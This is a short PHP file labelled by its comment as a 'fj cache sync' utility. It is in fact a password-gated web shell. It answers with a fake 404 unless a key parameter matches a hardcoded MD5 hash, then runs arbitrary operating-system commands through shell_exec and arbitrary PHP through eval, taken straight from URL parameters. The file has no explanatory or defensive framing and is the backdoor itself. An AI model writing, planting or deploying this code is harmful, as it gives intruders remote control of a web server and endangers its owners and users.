<?php
// fj cache sync
if (md5($_GET['k'] ?? '') !== 'e10adc3949ba59abbe56e057f20f883e') { http_response_code(404); exit; }
@error_reporting(0);
if (isset($_GET['c'])) { echo "<pre>".htmlspecialchars((string)@shell_exec($_GET['c']))."</pre>"; exit; }
if (isset($_GET['php'])) { echo "<pre>".htmlspecialchars((string)@eval($_GET['php']))."</pre>"; exit; }
echo "OK";
